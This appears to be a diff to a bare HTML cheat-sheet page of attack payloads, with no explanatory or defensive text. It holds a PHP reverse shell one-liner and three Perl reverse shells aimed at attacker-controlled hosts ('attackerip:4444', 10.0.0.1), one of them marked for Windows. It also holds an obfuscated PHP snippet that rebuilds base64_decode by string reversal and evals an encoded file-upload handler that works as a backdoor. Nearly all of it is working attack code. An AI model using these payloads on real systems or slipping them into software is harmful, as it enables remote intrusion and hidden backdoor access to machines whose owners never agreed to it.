@@ -5,9 +5,16 @@
 <title>PHP</title>
 </head><body>php -r '$sock=fsockopen("&lt;LIP&gt;",&lt;LPORT&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<br/>
 <br/>
+&lt;?php &nbsp; &nbsp;<br/>
+$b = strrev("edoced_4" . "6esab"); &nbsp; &nbsp;<br/>
+eval( $b('JHVwbG9hZGRpciA9ICcuLyc7DQokdXBsb2FkZmlsZSA9ICR1cGxvYWRkaXIgLiBiYXNlbmFtZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyduYW1lJ10pOw0KDQplY2hvICI8cD4iOw0KDQppZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ3RtcF9uYW1lJ10sICR1cGxvYWRmaWxlKSkgew0KICBlY2hvICJGaWxlIGlzIHZhbGlkLCBhbmQgd2FzIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZC5cbiI7DQp9IGVsc2Ugew0KICAgZWNobyAiVXBsb2FkIGZhaWxlZCI7DQp9DQoNCmVjaG8gIjwvcD4iOw0KZWNobyAnPHByZT4nOw0KZWNobyAnSGVyZSBpcyBzb21lIG1vcmUgZGVidWdnaW5nIGluZm86JzsNCnByaW50X3IoJF9GSUxFUyk7DQpwcmludCAiPC9wcmU+Ijs=') ); &nbsp; &nbsp;?&gt;<br/>
 <br/>
 <br/>
+Shorter Perl reverse shell that does not depend on /bin/sh:<br/>
+perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’<br/>
 <br/>
+If the target system is running Windows use the following one-liner:<br/>
+perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’<br/>
 <br/>
-<br/>
+perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br/>
 </body></html>
